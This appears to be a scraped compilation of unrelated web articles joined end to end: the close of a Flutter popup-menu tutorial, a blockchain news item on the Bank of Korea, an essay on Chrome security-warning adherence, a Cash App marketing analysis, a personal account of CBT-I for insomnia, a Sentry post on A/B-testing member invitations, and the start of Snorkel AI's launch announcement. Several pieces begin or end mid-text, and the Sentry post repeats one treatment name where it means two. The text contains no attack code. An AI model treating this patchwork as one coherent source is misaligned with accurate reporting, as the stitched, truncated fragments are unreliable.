</div><p>We will build <em>AppBarMenu</em> class that extends <em>PopupRoute</em>, as it gives us more control over UI of the menu than <em>PopupMenuButton</em> from the Flutter framework. On button press, Navigator widget is tasked to push our Route to the stack. Push method returns a future which completes after this route is dismissed - that’s why we set <em>_isMenuShown</em> to false in the <em>then </em>callback.</p><h2>Menu look &amp; feel<br></h2><p>Our final task is to build a menu that will be displayed. It’s pretty straightforward - a list with two items, the less obvious parts maybe how to place it on the screen, and how to achieve the shape of a rectangle with rounded corners and triangle indicator on top. We are going to use <em>ClipPath</em> widget with a custom clipper to build the desired shape. An alternative solution would be to compose <em>ClipRRect</em> (RRect stands for rounded rectangle) with an <em>Image</em> widget for the top triangle. Yet another idea is to have a whole background as a nine-patch image, and there are for sure a few more feasible options to achieve the desired UI. Due to Flutter’s widget-oriented architecture, there are often multiple ways how can we compose existing primitives into more complex structures - like this fancy-shaped menu. You can preview updated buttons and the menu on the gif below:<br></p><figure id="w-node-2d5de7a9800c-c5de3bde"><p><img src="https://global-uploads.webflow.com/5c95072393140f36ecc22e60/5eecaa9a37ac27758ef39129_Hnet.com-image%20(1).gif" alt="flutter_buttons_menu"></p></figure><h2>Conclusion<br></h2><p>Flutter allowed us to recreate, very closely, UI and UX of Wolt’s piece of the interface. We were able to achieve the compelling look &amp; feel quickly by composing native widgets, and even if there are certain limitations, due to open-source nature of the Flutter framework, achieving pixel-perfect quality is possible when needed.<br></p></div></div>]]>

			<p>According to <a href="https://thenews.asia/bank-of-korea-acquires-bank-sign/" target="_blank" rel="nofollow noopener noreferrer">The News Asia</a>, the Bank of Korea (BOK) is using blockchain technology in its banking sector also in order to commercialize the infrastructure. It has acquired Bank Sign for this purpose. It will help in transferring the financial services to a more organized structural framework. It will also help in making everything one step away with digital services. People will trust more the authentication and transparency of the system and will be able to invest in blockchain technology.</p>
<p>Bank Sign is a blockchain-based co-verification system that allows authenticated data to transfer among banks and financial institutions.</p>
<h2>Bank sign as&nbsp; a replacement for digital ID</h2>
<p>South Korea’s central bank plans to offer Bank Sign as a replacement for “Digital ID” (DID ). The COVID-19 pandemic situation is forcing South Korea’s banking stakeholders to consider other alternatives rather than currency exchanges such as digital alternatives for live operations.</p>
<p>Since the corona pandemic, organizations and banks have been trying to make everything online and operational through the digital space. Many people also believe that this pandemic can have positive outcomes for the emerging industries as they will render everything online.</p>
<p>Favoring the benefits of adopting Bank Sign, a BOK official told The News Asia:</p>
<blockquote><p>I expect that through cooperation, we will be able to realize cost reduction, service improvements, and discovery of new businesses</p></blockquote>
<p>The BOK adopting a blockchain digital ID system will not only strengthen the infrastructure but also will help in the development of advanced technology.</p>
<h2>Collaborating with Sendsquare to utilize blockchain in medical storage</h2>
<p>According to BTC Manager, the government is now planning to induce blockchain technology in medicine too by work in partnership with Send square.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>There’s a common myth among software engineers, and security engineers in
particular, that people will always click “yes” on any warning or prompt,
blindly accepting any risk about which the UI warns. This is not generally true,
and the misconception can lead to suboptimal design decisions and even <a href="https://noncombatant.org/2016/01/28/against-security-nihilism/">security
nihilism</a>.</p>

<h2 id="warnings-can-be-designed-for-adherence">Warnings can be designed for adherence</h2>

<p>Warning adherence is the percentage of users who do what a warning wants them to
do. For example, we say that users adhere to an SSL certificate warning if they
leave the offending site upon encountering the warning.</p>

<p>Design decisions can influence adherence significantly – for example,
redesigning the Chrome SSL warning
<a href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/43265.pdf">increased</a>
adherence from 37% to 62%. (Today, SSL warning adherence is even higher, at
around 80% on Windows. One possible
<a href="https://research.google/pubs/pub46359/">explanation</a> is that we got rid of many
false positive SSL errors, thereby leaving more real errors that users don’t
want to bypass, but I don’t know for sure.) Example of visual or interaction
adherence cues include highlighting the “safe” button or hiding the “unsafe”
button behind a dropdown.</p>

<figure>
  <img src="https://emilymstark.com/assets/cert_error.png" alt="Chrome 86 SSL certificate warning">
  <figcaption><i>Chrome 86 SSL
certificate warning. The safe option (“Back to safety”) is visually highlighted.
The unsafe option is only shown when the “Advanced” button is clicked.</i></figcaption>
</figure>

<p>Some warnings may not need to be as extremely opinionated as the SSL certificate
warning to achieve good adherence. For example, Chrome has a warning for
lookalike domains that use unusual characters to create convincing spoofing
domains. This warning, shown below, is designed to be less opinionated and makes
it easier for people to find the unsafe option, yet people choose the unsafe
option &lt;15% of the time.</p>

<figure>
  <img src="https://emilymstark.com/assets/lookalike_warning.png" alt="Chrome 86 lookalike domain warning">
  <figcaption><i>Chrome 86
SSL lookalike domain warning. This warning is designed to be less scary than the
SSL certificate warning, and it is easier for users to find and exercise the
unsafe option. The warning still produces good adherence.</i></figcaption>
</figure>

<p>It can also be useful to measure user behaviors other than adherence. People may
choose the unsafe option on a warning, but then act more cautiously as they
proceed (for example, by not entering passwords on the unsafe site). Depending
on the risk in question, this may or may not be a safe behavior. My team has
some recent data on this phenomenon that I hope we’ll be able to share publicly
soon.</p>

<p>There are some caveats to this approach of designing warnings for adherence:</p>
<ul>
  <li>In the
<a href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/43265.pdf">study</a>
I linked above, the redesigned warning did not improve comprehension. People
made safer decisions with the redesigned warning, but they didn’t understand
the warning better than before. Convincing people to make safe choices may be
easier than helping them understand the risks, especially in light of
follow-up <a href="https://research.google/pubs/pub46632/">research</a> suggesting that
there is no single easily-surmountable challenge that gets in the way of
comprehensibility.</li>
  <li>Designing for adherence can be seen as a spectrum. On one end of the spectrum
might be an <a href="https://stackoverflow.com/questions/35274659/does-using-badidea-or-thisisunsafe-to-bypass-a-chrome-certificate-hsts-error/35275060">obfuscated
password</a>
for bypassing the warning. This end of the spectrum could be seen as
paternalistic, or as favoring expert users and denying non-expert users the
same functionality. On the other end might be placing the safe and unsafe
options on equal footing with no visual or interaction distinctions. This end
of the spectrum lets people make their own uninfluenced choices, but puts them
at risk if they do not comprehend the warning well. I think that choosing a
point on this spectrum is probably a subjective, qualitative product decision,
but it’s important to know that the spectrum exists.</li>
</ul>

<h2 id="prompts-that-arent-warnings">Prompts that aren’t warnings</h2>

<p>One might concede that warnings can achieve good adherence, but still speculate
that users will always say “yes” to a prompt – a neutral question that doesn’t
have any particular desired outcome.</p>

<p>I’m less familiar with the research in this area, and there may in fact be less
research overall. But, one public data source we have is the <a href="https://developers.google.com/web/tools/chrome-user-experience-report">Chrome User
Experience
Report</a>,
which recently added <a href="https://developers.google.com/web/updates/2020/02/notification-permission-data-in-crux">permission acceptance
data</a>
for the web notification permission prompt. This data suggests that users
neither blindly accept nor deny notification permission prompts. To pick a few
examples that come to mind, users accept ~3% of notification prompts on
www.tomshardware.com, ~22% on www.facebook.com, and ~82% on news.google.com (as
of early 2020). These numbers are not apples-to-apples comparisons; many
factors, including the audience and context of the website, will influence the
acceptance rate. However, I do think these numbers suggest that users do not
have a constant uniform reaction to permission prompts.</p>

<h2 id="so-what-does-this-mean">So what does this mean?</h2>

<p>Developers shouldn’t assume that users will always blindly say “yes” to any
security or privacy warning or prompt. We can design warnings to achieve good
adherence, and even neutral prompts elicit neither a single uniform response nor
a random response. Still, I think of it as good practice to avoid overloading
people with security and privacy decisions, especially when the risks may not be
comprehensible. I also think it can become unmaintainable to expose every
security decision in the UI; software designers need to prioritize which choices
to expose, and users should choose the software that gives the right level of
control for them.</p>

<h6>Cardi B is the <a href="https://twitter.com/CashApp/following">only person that Cash App follows on Twitter</a>! (via YouTube)</h6>
<p>Last week’s “Cash App Friday” came at the perfect time. The COVID-19 pandemic has been costly, scary, and uncertain, especially for those living paycheck-to-paycheck. On Cash App Fridays, the mobile payment app users can log on Twitter and reply to <a href="https://twitter.com/CashApp">@CashApp</a> with their $cashtag for a chance to win prizes that range from $100 to $500. Later that weekend, Cash App matched some of the giveaways from Shea Serrano –The Ringer staff writer and <a href="https://trapital.co/2019/11/04/shea-serrano-on-the-economics-of-book-publishing-movies-and-other-things-and-how-dj-screw-inspired-his-promotional-tactics/">Trapital Podcast guest</a>— who had already made it habit to give money to those in need.</p>
<p>These philanthropic measures are gracious, but it’s essential to Cash App’s growth model. In 2019, the company spent an estimated <a href="https://money.com/what-is-cash-app-friday/">$60,000 on Cash App Fridays</a>. In return, it earned much more in heightened brand awareness and earned media. This strategy translated well to hip-hop, where rappers use the app to give money to fans. Cash App has now been name-dropped by over 200 hip-hop artists.</p>
<p>Cash App achieved the modern brand’s dream: to become part of the culture. No appropriation. No cringe-worthy attempts to sound like a 23-year-old hypebeast. All genuine. It’s easier said than done, and it’s a model others can learn from.</p>
<hr>
<h4><strong>Make it easy for the customer</strong></h4>
<p>When Cash App launched in 2013, it was much more buttoned-up. Users needed phone numbers or email addresses to transfer money. A year and a half later, the service eased up, followed Venmo’s lead with usernames, and introduced the <a href="https://squareup.com/us/en/press/introducing-cashtags">$cashtag</a>. These handles made the app more social and reduced friction to transfer money.</p>
<p>Square continued this trend when it offered debit cards. From <a href="https://www.fool.com/investing/2018/02/28/squares-cash-app-killed-it-in-2017.aspx">Motley Fool</a>:</p>
<blockquote><p>Square introduced a virtual debit card at the end of 2016, which allowed users to spend their Cash App balance online or through a mobile wallet. So, if you were ordering a pizza online, for example, your friends could send you money on Cash App, then you could pay for the pie with the debit card number.</p>
<p>Square followed it up in April with a physical debit card and allowed users to add a personalized signature or drawing to the front of the card. The card has proved extremely popular, with users spending over $90 million using their Cash Cards during the month of December. That’s a run rate of over $1 billion.</p></blockquote>
<p>It dropped a full year before Venmo’s debit card, which also helped!</p>
<p>Cash App took its efforts to another level in November 2017 when it introduced the ability to trade Bitcoin. This was one month before Bitcoin’s peak valuation (and peak public interest). The timing was perfect. It would be like buying Nicki Minaj stock the month before “Monster” came out.</p>
<p>Square CFO Amrita Ahuja said that Cash App’s Bitcoin and Investing customers <a href="https://www.forbes.com/sites/darrynpollock/2020/02/29/bitcoin-paying-off-for-squares-cash-app-raking-in-178-million/#4ea73a5e28e7">generate up to two-to-three times more revenue</a> than the rest. Since Bitcoin accounts for about <a href="https://www.coindesk.com/bitcoin-drove-half-of-squares-cash-app-revenue-in-the-4th-quarter">half of Cash App’s revenue</a> and Cash App has 24 million monthly active users, that means less than 7 million (28%) use those features.</p>
<p>Most companies would use this as a reason to solely focus on acquiring more Bitcoin investors. They would run ads in fintech newsletters, sponsor emerging tech meetups, find Libertarian groups on Reddit, and so on.</p>
<p>But Cash App expanded its reach. Cash App giveaway recipients aren’t exactly the demo for Bitcoin investing. But they might be someday and may spread the word to someone who <em>is</em> in that cryptocurrency demo. That’s what Cash App is banking on (literally). This is the long game.</p>

<h6>This is a Spotify screenshot of songs named “Cash App.” That list keeps going… it’s clearly an SEO play.</h6>
<h4><strong>Influencer marketing done right</strong></h4>
<p>Square is still not entirely sure how Cash App first became popular with hip-hop. Here’s Square CEO Jack Dorsey at a 2019 investor conference via <a href="https://www.wsj.com/articles/dont-venmo-iggy-azalea-cash-app-rules-rap-11565191206">Wall Street Journal</a>:</p>
<blockquote><p>“This is also something we weren’t expecting, but I think Cash App has touched in the culture. We’ve just benefited from people loving it and wanting to sing about it, and putting it in their music videos, and it’s amazing how much that spreads.”</p></blockquote>
<p>But once Square noticed the trend, it locked in. In 2018 it teamed up with <a href="https://www.businessinsider.com/travis-scott-is-giving-away-100000-to-fans-through-the-cash-app-2018-8">Travis Scott </a>and <a href="https://www.complex.com/music/2018/08/why-are-rappers-giving-away-money-cash-app-lil-b">Lil’ B</a>. In December, it got together with <a href="https://cash.app/legal/us/en-us/snoop-special-stars">Snoop Dogg</a>. Each of them used the app to give away money. The company acquired customers through the rappers’ social media followings at an extremely low cost. Free money is an easy sell, and it doesn’t take that many customers to justify the cost.</p>
<p>Here’s a great breakdown from <a href="https://ark-invest.com/research/squares-cash-app-twitter">Ark Invest</a> on the low-cost customer acquisition:</p>
<blockquote><p>While banks can pay from $350 to $1500 to acquire users, Cash App acquired a new customer through Burger King in five minutes without any direct mail or bank branch visit.</p>
<p>Square has run similar [$100,000] campaigns with rappers like Travis Scott and Lil B and other influencers, triggering a network effect for the Cash App… If only 129 of the 120,000 who commented on [Travis Scott’s] tweet were new to Cash App, then Square’s cost of customer acquisition would have been less than the $925 per user that banks pay on average, according to our research, and 6,000 comments, only 5% of the total, would have dropped it to $20. Moreover, as the converted users appear to spread the word on social media, the Cash App can acquire additional users from just one.</p></blockquote>
<p>That’s well worth $100,000 for both La Flame and Cash App. It’s even more worthwhile considering the influence that hip-hop fans have on their peers. According to <a href="https://www.revolt.tv/2020/1/1/21043728/generation-hip-hop-2020">REVOLT’s Gen Hip Hop study</a>, hip-hop fans are 2x more likely to be culturally influential. It’s the right audience to acquire.</p>
<p>Cash App’s user base is <a href="https://twitter.com/hknightsf/status/1239976638844039168?s=20">strongest in the South and the Midwest</a> of the US, which aligns with the regions where many hip-hop fans are at. It’s the opposite of most founders who focus first on their “early adopter” personal networks in the coastal metro hubs in New York and San Francisco. This strategy made more sense years ago when broadband internet access was noticeably stronger in tech hubs and universities, but that’s no longer the case. It’s 2020. Smartphones are now ubiquitous. It’s time to think beyond Mark Zuckerberg’s Ivy League expansion plan that worked for Facebook in 2004.</p>
<p>Venmo’s growth strategy was more aligned with the traditional tech growth model. The founders are UPenn alums who hit up Princeton Hackathons and other similar events. It had its own “Million Dollar Money Tree” cash giveaway and $5 referral sign-up bonuses to attract customers. But those offers were also centered around Ivy League users and their friends who live on the coasts.</p>
<p>Cash App’s <a href="https://s21.q4cdn.com/114365585/files/doc_financials/2019/q4/2019-Q4-Shareholder-Letter-Square.pdf">monthly active users have grown</a> from 7 million in 2017, 15 million in 2018, to 24 million in 2019. It still trails Venmo in users, but Cash App is <a href="https://www.fool.com/investing/2019/08/27/the-gap-between-cash-app-and-venmo-is-getting-bigg.aspx">growing faster</a>.</p>
<p>I drew this chart to highlight the difference:</p>

<h4><strong>An effective flywheel</strong></h4>
<p>Cash App’s strategy is a true flywheel that drives more peer-to-peer transactions. The hip-hop influencers and their fans grew the user base and brand awareness further, which gained the attention of those who seek higher-end services like Bitcoin and Investing.</p>
<p>The flywheel looks like this:</p>

<p>It’s similar to Jay Z’s flywheel with his <em>4:44</em> release. Here’s <a href="https://trapital.co/2019/11/21/jay-zs-cell-phone-partnership-strategy-explained/">what I wrote last year</a>:</p>
<blockquote><p>Jay Z made a sale that valued the company at more than 10x his purchase price just two years earlier. That’s impressive especially with all the turmoil and controversy that surrounded Tidal during that stretch.</p>
<p>But the real kicker is that $75 million was budgeted for exclusive content for Sprint. Five months after the deal was publicized, Jay Z dropped 4:44 as a Sprint-Tidal exclusive. This connected the streaming service with Sprint, which now had a vested interest in Tidal’s success (not too different from Live Nation’s interest in Roc Nation). And by partnering with a cellular carrier instead of a manufacturer like Nokia or Samsung, Jay increased his flexibility and integration capabilities.</p></blockquote>
<p>Jay Z distributed his album through Sprint because it has an active customer base and a means to deliver his product. Sprint was now a co-owner of Tidal, Jay’s streaming service. The cellular carrier had a vested interest in both the delivery and implementation. And Sprint customers got the album for free. Everybody won.</p>

<hr>
<p>In this next decade, Cash App’s customer acquisition tactics will be replicated by many. Products that are built to serve the mass consumer will waste time if they religiously follow Silicon Valley’s age-old mantra to “start in San Francisco and New York” and expand from there. That traditional plan still makes sense for a product like Superhuman, the $30 / month email service that’s specifically targeted at that who will pay for that. It’s less ideal for an app that relies on network effects and massive scale.</p>
<p>Mass-market products need branding. In consumer tech, hip-hop has been the backbone. TikTok had Lil’ Nas X. Snapchat had DJ Khaled. YouTube had Soulja Boy. The list goes on. Hip-hop culture influence continues to grow, and more companies will find their own way to engage fans.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>I'd done everything right, yet it was 2 am and I still couldn't sleep. I had meditated for 30 minutes before I went to bed. I even took a couple of melatonin pills right after to be sure. Yet, here I was wide awake dreading how exhausted I would be the next day at work.</p><p>My problem wasn't unique. In America, one in every 10 adults will experience chronic insomnia<sup><a href="#references">1</a></sup>. It takes just one poor night of sleep to devolve into long term sleeping problems. This is because the majority of sleeping problems stem from anxiety and worry<sup><a href="#references">2</a></sup>. <b>The more you worry about not getting enough sleep, the worse your sleep gets</b>.</p><p>For me, my sleeping issues began right out of college. I had started a job as a software engineer and I was starting to feel the pressure. I had a couple of big deadlines coming up and I found myself tossing and turning unable to sleep one night. My mind kept racing, thinking about all the work I had until I finally fell asleep.</p><p>I thought that was it — an abnormal night, but then it happened again. This time, my outlook changed. I started worrying about how not getting enough sleep would affect my day. I looked up basic sleep hygiene tips online and decided to go to bed extra early to make sure I made up for lost sleep. This ended up backfiring and it took a few hours before I could finally sleep.</p><p>At this point, my sleeping struggles started becoming more regular. I downloaded a couple of meditation apps in the hopes that meditating and listening to soothing sounds would help me sleep better. I even resorted to over the counter sleeping aids on nights when it took me too long to fall asleep. <b>The results were mixed — I'd fall asleep faster but over time I'd revert back to having poor sleep</b>.</p><p>I finally caved and decided to try prescription medication. I had read a lot about them and was very reluctant because of their long term side effects. On a visit to my doctor, I asked her if she could prescribe me something to help me sleep. She said she said she could, but it wasn't going to be medication. Instead, she put in a referral to a CBT-I (Cognitive Behavioral Therapy for Insomnia) therapist.</p><p>CBT-I is an evidence-based (proven in clinical trials) technique used to treat sleep problems<sup><a href="#references">3</a></sup>. <b>Two driving forces induce sleep — sleep drive &amp; mental arousal</b>. Your sleep drive is how sleepy/tired you feel when going to bed. Your mental arousal is the racing thoughts and alertness you feel when you go to bed. When your sleep drive is high and your arousal levels are low; it is easier to fall asleep. CBT-I prescribes a sleep schedule that ensures you have a high sleep drive. It also teaches you techniques to worry less and reduce your arousal.</p><p><b>CBT-I is extremely effective in treating sleeping problems</b>. Clinical trials have shown that 80% of people that follow a good CBT-I program will have normal sleep by the end<sup><a href="#references">4</a></sup>. The results are also permanent, unlike sleeping aids which are effective only as long as you are taking them<sup><a href="#references">5</a></sup>.</p><p>There were three main rules that I had to follow -</p><ol><li><p>I could only sleep within the sleep window my therapist prescribed. This ensured that I only went to bed when my sleep drive was high.</p></li><li><p>Every time I couldn't sleep, I had to make sure I didn't stay in bed for over 20 minutes. This way, I would subconsciously re-train my mind to not associate my bed with wakefulness<sup><a href="#references">6</a></sup>.</p></li><li><p>No day time naps and no caffeine after 2pm.</p></li></ol><div><p>I was sleeping around 5 hours at the time, so we set a 6 hour window within which I could sleep (1am - 7am in my case). I kept a log of how long it took me to sleep, how long I was awake in the middle of the night and how long I slept. This data was recorded to the closest 15th minute and is self reported. At the end of each week, my therapist would alter my sleep schedule based on the previous week's data.<b> Note:</b> Time awake is the time it took me to fall asleep + my night time awakenings
</p></div><p>
At the end of week 1, I was sleeping about the same as I was before. My time awake at night though had fallen by an hour. I was falling asleep faster and I was having less interrupted sleep. We decided to stick to the same sleep schedule for week 2.
</p><p>
At the end of this week, my sleep had increased and I was consistently awake for less than an hour. We decided to expand my window by 15 minutes for week 3.
</p><p>
We followed the same rules and either expanded or kept the same sleeping window for the next few weeks.
</p><p><b>At the end of the 10 week program, I was sleeping over 7 hours a night</b>. More importantly, I wasn't spending my days worrying about my sleep.
</p><p><b>CBT-I isn't an easy solution</b>. The sleep schedules are hard to follow and the results aren't instantaneous. It takes time and effort but the reward of permanently improved sleep is well worth it. Let me know if you do decide to try it and if it helps you improve your sleep. Here's to hoping you get better sleep soon.</p><p>If you'd like to know more about CBTI and other behavioral therapy techniques to improve sleep, check out our <a href="https://www.sleepedy.com/" target="_blank" rel="nofollow noopener noreferrer">website</a>!</p><h2 id="references">References</h2><ol><li><p><a href="http://sleepeducation.org/news/2014/03/10/insomnia-awareness-day-facts-and-stats" target="_blank" rel="nofollow noopener noreferrer">Insomnia Awareness Day by the American Association of Sleep Medicine</a></p></li><li><p><a href="https://adaa.org/understanding-anxiety/related-illnesses/sleep-disorders" target="_blank" rel="nofollow noopener noreferrer">Sleep Disorders by the Anxiety and Depression Association of America</a></p></li><li><p><a href="https://www.sleepedy.com/cbt-for-insomnia" target="_blank" rel="nofollow noopener noreferrer">CBT for Insomnia: A comprehensive guide</a></p></li><li><p>Trauer, James M. et al. “<a href="https://www.ncbi.nlm.nih.gov/pubmed/26054060" target="_blank" rel="nofollow noopener noreferrer">Cognitive Behavioral Therapy for Chronic Insomnia: A Systematic Review and Meta-analysis.</a> Ann Intern Med.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><time datetime="2020-02-12T00:00">February 12, 2020</time><div><p>At its core, Sentry is a tool that alerts you to defects in your production software. But it does more than blast stack traces into your inbox: Sentry provides powerful workflows to help your team determine root cause, <a href="https://blog.sentry.io/2019/02/07/sentry-workflow-triage">triage issues</a> to your team, and keep tabs on ongoing concerns with comments and notifications.</p>
<p>These collaborative features can help you resolve problems with your software quickly. But the keyword here is <strong>collaborative</strong>; without your full team having access to Sentry, you may find yourself quickly becoming overwhelmed with an endless backlog of issues and no one to help.</p>
<p>At the end of 2019, the Growth team made it our mission to make it easier for our users to invite their teammates to join them on Sentry. To achieve this, we tackled three distinct areas:</p>
<ol>
<li>Surfacing the ability to invite users contextually</li>
<li>Expanding Sentry’s permission model to allow <em>more types of users</em> to send invitations </li>
<li>Allowing external users to request access themselves</li>
</ol>
<p>Our theory: improving the user experience of inviting users, <em>as well as</em> democratizing the process to include all team members would lead to a significant increase in team-wide adoption. <em>(Narrator: it did.)</em></p>

<p>Before we get deep into what we changed and how it impacted the bottom line, let’s quickly revisit how user invitations worked: the <em>Add Member to Organization</em> page you see below.</p>

<p>This full-page experience, tucked away deep in Sentry’s account settings, had a number of issues:</p>
<ol>
<li>Since this is a full page, reaching it meant you would be taken out of context of whatever you were doing previously</li>
<li>Its location deep in our navigation hierarchy meant discoverability was poor</li>
<li>It’s <em>unclear</em> you can actually invite multiple people at once (you can!)</li>
<li>When inviting multiple users, you could only assign the group to the same role and collection of teams</li>
</ol>
<p>Interestingly, to improve discoverability, we had previously introduced a number of “quick links” to reach this page more easily. But these links were scattered around the application, and didn’t appear contextually when users signaled intent to invite members.</p>
</div><figure><p><img src="https://images.ctfassets.net/em6l9zw4tzag/4xiHp1Gl0HaZ0l8USGDPLr/79402583357d98cf55ad2dfda6ffe537/2-invitations.png" alt="" title="2-invitations"></p></figure><div>
<p>These user experience and discovery challenges felt like obvious starting places. But instead of just settling for a new “improved” form, we decided to rethink the entire experience from the ground up.</p>

</a>The new member invitation modal</h2>
<p>It’s probably not a surprise that our first instinct was to convert this page into a modal –&nbsp;one that manages to squeeze all of the capabilities shown earlier into a smaller, more concise experience. It actually does one better: the modal is clearer in indicating that you can invite multiple users, and allows you to set unique permissions for each invitee.</p>

<p>While modals are sometimes overused in web applications, we believed this approach would solve our key discoverability and navigation concerns: it can be shown contextually without leaving the current page, and completing the form returns you to what you were doing.</p>
<p>To that point, we additionally introduced buttons to launch this <em>Invite New Members</em> modal contextually throughout Sentry:</p>
<ul>
<li>Viewing an issue and notice a <a href="https://docs.sentry.io/workflow/releases/?platform=node#after-associating-commits">suspect commit</a> made by a coworker? If they’re not already part of your Sentry organization, you can now invite them then and there.</li>
<li>Trying to assign an issue to a team member, but don’t see their name in the assignee list? You now have the option to invite them right in the dropdown.</li>
<li>Creating a new team? Now you can invite new members directly to that team as you go.</li>
</ul>

</a>Democratizing invitations</h2>
<p>As we began rolling out our new <em>Invite New Members</em> experience across the application, we came to a sobering realization: only roughly <strong><em>half</em></strong> of Sentry users could actually use our new modal. That’s because historically, only those with Owner or Manager-level permissions could invite other team members. Combined, users with these permissions accounted for less than 50% of active users.</p>

<p>Restricting the ability to add new users to account administrators is pretty common practice for software tools, and Sentry is no exception. When an employee onboards on a new team, it’s common to see an exchange like this:</p>
<blockquote>
<p>Alice: Oh awesome, we use Sentry. Can you add me to the organization?
Bob: Ah, I can’t invite you. Maybe ask Jen?</p>
</blockquote>
<p>In a perfect world, one of your administrators is tracked down, and they manually add the new teammate to the account. But sometimes that person is unknown, or is on a vacation, or maybe it takes them days or weeks or even months.</p>
<p>We began asking ourselves: what if we could unlock team members to fast-track this whole process and invite members themselves? This led to our next major change: updating our permission model to allow for <strong>members to request to invite other members.</strong></p>

<p>Now, when non-administrators open up the Invite New Members modal, it changes contextually to become a “request to invite” rather than a direct invitation. Hitting “send” kicks off an email to all organization administrators, who are prompted to approve any outstanding requests.</p>

<p>At this point, we had built what we thought was a fantastic new user experience and we just <em>doubled</em> the number of users who could take advantage of it. But this exercise of opening up user invitations got us thinking: what if there was an even <em>further</em> source of untapped users we weren’t reaching?</p>

</a>Removing the middleman entirely</h2>
<p>In the last section, we highlighted a scenario where one teammate asks another teammate for access to Sentry. And because of our recent changes, users can request to invite their teammates themselves instead of having to track down and ask their account administrator.</p>
<p>But this scenario still has a gatekeeping element: the new teammate has to ask <em>another</em> teammate for access. What if the new teammate spots an alert from Sentry in Slack stemming from their recent changes, and no one’s around to grant them access? Unfortunately, they’d land on an authentication wall that would prevent them from going any further.</p>

<p>This begged the question: was there an untapped source of potential users we weren’t reaching by restricting invitations <em>only</em> to active Sentry users? What if new users didn’t have to ask anyone at all?</p>
<p>So, to keep this party going, we dug in and additionally made it possible for <strong>external users to request to join an organization</strong>.</p>

<p>Now when a user lands on an Organization’s login page, they have the option to “Request to join”, which asks for the user’s name and email address. Once they hit send, the organization owners are sent an email that prompts them to approve the join request. Just in case, there’s also a call-to-action to disable the feature entirely for their organization.</p>

<p>Having developed a new contextual invitation modal and a pair of invite-friendly permission changes, we were <em>feeling</em> confident that these changes were going to have a strong impact on user behavior. It was time now to put our money where our code was, and verify that all this hard work actually moved the needle.</p>

</a>A/B testing the impact</h2>
<p>Our standard procedure for validating the efficacy of product changes is through A/B testing (also known as split testing). This means instrumenting our application code to serve different experiences to segments of users over the same time period, and comparing the results. This step takes extra effort, but it’s worth it –&nbsp;the alternative is to settle for a before-and-after snapshot of data, which is too easily impacted by external factors like seasonality or marketing pushes.</p>
<p>ℹ️ <em>To learn more about how we perform A/B testing at Sentry, please see <a href="https://blog.sentry.io/2019/05/09/easy-ab-testing-with-planout">this earlier blog post</a>.</em></p>
<p>It’s easy to get carried away with A/B testing, and having so many permutations that you don’t have enough data to be statistically significant. So, to simplify things, we decided that all treatments would get the new modal experience, and our “treatment” groups would focus on the new permission changes.</p>
<p>This left us with 4 distinct treatments that we rolled out to 4 equally-sized customer segments:</p>
<ol>
<li><strong>Baseline</strong> (new modal only)</li>
<li><strong>Request to Invite</strong> (user invites another user)</li>
<li><strong>Request to Join</strong> (external user requests to join)</li>
<li><strong><em>Both</em></strong> Request to Invite and Request to Join are enabled together</li>
</ol>
<p>Our main criteria for determining success: which of these treatments would result in <strong>an increase in <em>accepted</em> invitations</strong> (and thus new users)?</p>
</div><figure><p><img src="https://images.ctfassets.net/em6l9zw4tzag/rlobEVJ4FCzWbU1tmPqqb/8ed779f9a63aa3382e5590cfa8e4bec1/11-invitations_2_.png" alt="" title="11-invitations"></p><figcaption><p>% of accepted invitations relative to baseline</p></figcaption></figure><div>
<p>After 30 days, the results became clear (not to mention, statistically significant):</p>
<ul>
<li><strong>11%</strong> more users accepted invitations in the <em>Request to Invite</em> treatment vs. the baseline</li>
<li><strong>9%</strong> more users accepted invitations in the <em>Request to Join</em> treatment vs. the baseline</li>
<li><strong>21%</strong> more users accepted invitations who had both <em>Request to Invite</em> and <em>Request to Invite</em> treatments enabled</li>
</ul>
<p>It’s probably not a surprise that allowing a wider set of users to invite team members resulted in more users inviting team members. It’s also probably not a surprise that enabling both feature sets at the same time was even better (given that they complement each other)!</p>

                  <p>
                      Today I’m excited to announce Snorkel AI’s launch out of stealth!
                      Snorkel AI, which spun out of the Stanford AI Lab in 2019, was founded on two simple premises: first, that the labeled <b>training data</b>  machine learning models learn from is increasingly what determines the success or failure of AI applications.
                      And second, that we can do much better than labeling this data entirely by hand.
                  </p>
                  <p>
                      At the Stanford AI lab, the Snorkel AI founding team spent over four years developing new <b>programmatic</b> approaches to labeling, augmenting, structuring, and managing this training data.
                      We were fortunate to develop and deploy early versions of our technology with some of the world’s leading organizations like <a href="https://ai.googleblog.com/2019/03/harnessing-organizational-knowledge-for.html">Google</a>, <a href="https://dl.acm.org/doi/abs/10.1145/3329486.3329492">Intel</a>, <a href="https://arxiv.org/abs/1909.05372">Apple</a>, <a href="https://www.sciencedirect.com/science/article/pii/S2666389920300192">Stanford Medicine</a>, resulting in <a href="https://www.snorkel.ai/technology#reference">over thirty-six peer-reviewed publications</a> on our findings; innovations in weak supervision modeling, data augmentation, multi-task learning, and more; inclusion in university computer science curriculums; and deployments in popular products and systems that you’ve likely interacted with in the last few hours.
                  </p>
                  <p>
                      Through all this academic tinkering and industry spelunking, we realized two things: first, that this concept of labeling and building training data programmatically, rather than by hand, had transformational potential to make machine learning more iterative, auditable, faster to deploy, and ultimately, more practical.
                      And second, that these ideas changed not just how you label training data, but so much of the entire lifecycle and pipeline of ML: how knowledge and feedback is injected; how models are constructed, trained, versioned, and monitored; how entire pipelines are developed iteratively; and how the full set of stakeholders in any ML deployment, from subject matter experts to ML engineers, are incorporated into the process.
                  </p>
                  <p>
                      In other words, we saw that this shift to programmatic training data required a top-to-bottom rewrite of the entire ML development and deployment process.
                      With the support of some amazing investors (Greylock, GV, In-Q-Tel, and others) and incredible early customers, we’ve spent the last year doing just this: building and deploying <a href="https://www.snorkel.ai/platform">Snorkel Flow</a>, an end-to-end platform to support this new vision of the ML process.
                  </p>
                  <h2>The Training Data Bottleneck</h2>
                  <p>
                      Snorkel Flow was motivated first and foremost by a growing realization that training data had become the key bottleneck in much of ML pipeline and AI application development.
                  </p>
